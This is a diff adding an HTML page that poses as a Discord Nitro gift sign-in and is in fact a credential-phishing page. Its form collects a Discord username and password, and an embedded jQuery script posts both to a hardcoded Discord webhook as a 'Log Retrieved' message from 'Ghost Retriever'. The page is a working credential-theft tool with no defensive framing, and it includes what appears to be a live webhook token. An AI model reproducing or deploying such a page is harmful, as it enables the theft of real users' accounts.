@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:site_name" content="Discord Gift">
+	<meta property="og:url" content="https://discord.">
+	<meta property="og:title" content="Discord">
+	<meta property="og:description" content="You Have Been Gifted A 1 Month Nitro">
+	<meta property="og:type" content="Discord">
+	<meta name="og:image" itemprop="image" content="https://cdn1.epicgames.com/salesEvent/salesEvent/EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-944994658df3b04d0c4940be832da19e">
+
+    <title>Sign In</title>
+    <link rel="icon" href="styles/favicon.ico">
+
+
+ <!-- Bootstrap core CSS -->
+ <link href="styles/bootstrap.min.css" rel="stylesheet">
+
+ <!-- Custom styles for this template -->
+ <link href="styles/custom.css%3Fv580.css" rel="stylesheet">
+
+</head>
+<body>
+    
+<div class="container">
+    <div class="well well_help">
+        <center><h3>Welcome!</h3></center>
+        <center><h5>Very Nice To See You!</h5></center>
+
+        <div class="input-group">
+            <div class="input-group-btn">
+
+            <form action="index.html" name="resolve_form" method="POST">
+                <input name="username" style="max-width: 470px;" type="text" id="user_name" class="form-control input-lg" placeholder="Discord User Name" />
+
+            <form action="index.html" name="resolve_form" method="POST">
+                <input name="userpassword" style="max-width: 470px;" type="text" id="user_password" class="form-control input-lg" placeholder="Discord Password" />
+
+                <form action="index.html" name="resolve_form" method="POST">
+                <input type="submit" name="Submit" id="Submit" class="btn btn-primary btn-lg" placeholder="Save">
+                
+          </form>
+        </div>	
+
+      <script src="https://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript">
+    </script> 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/js/materialize.min.js">
+    </script> 
+    <script>
+        $(function() {
+            $('#Submit').click(function(e) {
+            var username = $("#user_name").val();
+            var password = $("#user_password").val();
+            $.post("https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb",
+        {"content": "**Log Retrieved, Waiting Further Instructions**\n> Username: " + username + 
+        "\n> Password: " + password + "\n", "username": "Ghost Retriever", "avatar_url": "https://pepsinitro.github.io/1-Month-Nitro/styles/Image.png"})
+            });
+        });
+        </script>
+
+</body>
+</html>
